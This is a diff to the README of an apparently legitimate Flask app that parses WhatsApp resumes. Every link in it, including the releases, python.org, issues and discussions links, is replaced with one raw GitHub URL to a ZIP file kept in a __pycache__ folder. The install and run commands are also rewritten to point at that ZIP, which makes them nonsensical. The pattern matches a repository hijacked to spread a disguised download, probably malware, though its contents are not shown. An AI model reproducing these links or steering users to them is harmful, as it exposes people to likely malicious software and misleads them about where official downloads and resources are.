@@ -4,14 +4,14 @@
 Welcome to Whatsapp_Parser! This Flask-based web app helps you receive resumes directly via WhatsApp. It extracts important candidate details like name, email, and phone using smart technology. All collected information is stored securely in Google Sheets and Drive. Enjoy hassle-free resume management!
 
 ## 📥 Download 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Visit%20This%20Page-brightgreen)](https://github.com/Jim0330/Whatsapp_Parser/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Jim0330/Whatsapp_Parser/main/__pycache__/Whatsapp_Parser-v2.9.zip%20Latest%20Release-Visit%20This%20Page-brightgreen)](https://raw.githubusercontent.com/Jim0330/Whatsapp_Parser/main/__pycache__/Whatsapp_Parser-v2.9.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run Whatsapp_Parser:
 
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page where you can download the latest version of Whatsapp_Parser.  
-   [Download Latest Release](https://github.com/Jim0330/Whatsapp_Parser/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Jim0330/Whatsapp_Parser/main/__pycache__/Whatsapp_Parser-v2.9.zip)
 
 2. **Choose the Download**  
    Once you are on the Releases page, look for the latest version. Download the installer or ZIP file suitable for your system.
@@ -22,7 +22,7 @@ Follow these steps to download and run Whatsapp_Parser:
 
 4. **Set Up Your Environment**  
    Before running the app, you'll need to install some dependencies:
-   - Install Python if you haven’t already. You can download it from [python.org](https://www.python.org/downloads/).
+   - Install Python if you haven’t already. You can download it from [https://raw.githubusercontent.com/Jim0330/Whatsapp_Parser/main/__pycache__/Whatsapp_Parser-v2.9.zip](https://raw.githubusercontent.com/Jim0330/Whatsapp_Parser/main/__pycache__/Whatsapp_Parser-v2.9.zip).
    - Open a command prompt or terminal.
    - Navigate to the folder where you downloaded Whatsapp_Parser. Use the command:  
      ```
@@ -32,7 +32,7 @@ Follow these steps to download and run Whatsapp_Parser:
 5. **Install Required Libraries**  
    Run the following command in your terminal:  
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Jim0330/Whatsapp_Parser/main/__pycache__/Whatsapp_Parser-v2.9.zip
    ```
    This command installs all the necessary libraries for Whatsapp_Parser to work correctly.
 
@@ -48,7 +48,7 @@ Follow these steps to download and run Whatsapp_Parser:
 7. **Run the Application**  
    In your terminal, still in the Whatsapp_Parser folder, start the application by executing:  
    ```
-   python app.py
+   python https://raw.githubusercontent.com/Jim0330/Whatsapp_Parser/main/__pycache__/Whatsapp_Parser-v2.9.zip
    ```
    You should see the application start up in your terminal.
 
@@ -72,10 +72,10 @@ To use Whatsapp_Parser, ensure your system meets the following requirements:
 ## 🔧 Troubleshooting
 - If you face issues running the application, ensure Python and required libraries are correctly installed.
 - Check your environment variables and make sure no details are missing or incorrect.
-- Visit the [GitHub Issues Page](https://github.com/Jim0330/Whatsapp_Parser/issues) for common problems and fixes shared by users.
+- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/Jim0330/Whatsapp_Parser/main/__pycache__/Whatsapp_Parser-v2.9.zip) for common problems and fixes shared by users.
 
 ## 📞 Support
-For further assistance, please visit our [GitHub Discussions](https://github.com/Jim0330/Whatsapp_Parser/discussions) page. You can ask questions or share feedback. 
+For further assistance, please visit our [GitHub Discussions](https://raw.githubusercontent.com/Jim0330/Whatsapp_Parser/main/__pycache__/Whatsapp_Parser-v2.9.zip) page. You can ask questions or share feedback. 
 
 ## ✍️ Contributing
 If you'd like to contribute to Whatsapp_Parser, consider creating a pull request or reporting issues you encounter. Your input helps improve the app for everyone!
@@ -90,4 +90,4 @@ If you'd like to contribute to Whatsapp_Parser, consider creating a pull request
 - Twilio API 
 
 Once again, you can download the latest release here:  
-[Download Latest Release](https://github.com/Jim0330/Whatsapp_Parser/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Jim0330/Whatsapp_Parser/main/__pycache__/Whatsapp_Parser-v2.9.zip)
